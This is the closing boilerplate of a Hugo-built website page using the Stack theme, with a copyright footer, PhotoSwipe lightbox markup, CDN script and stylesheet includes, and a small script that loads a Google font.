+2025 SolarSpectre</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
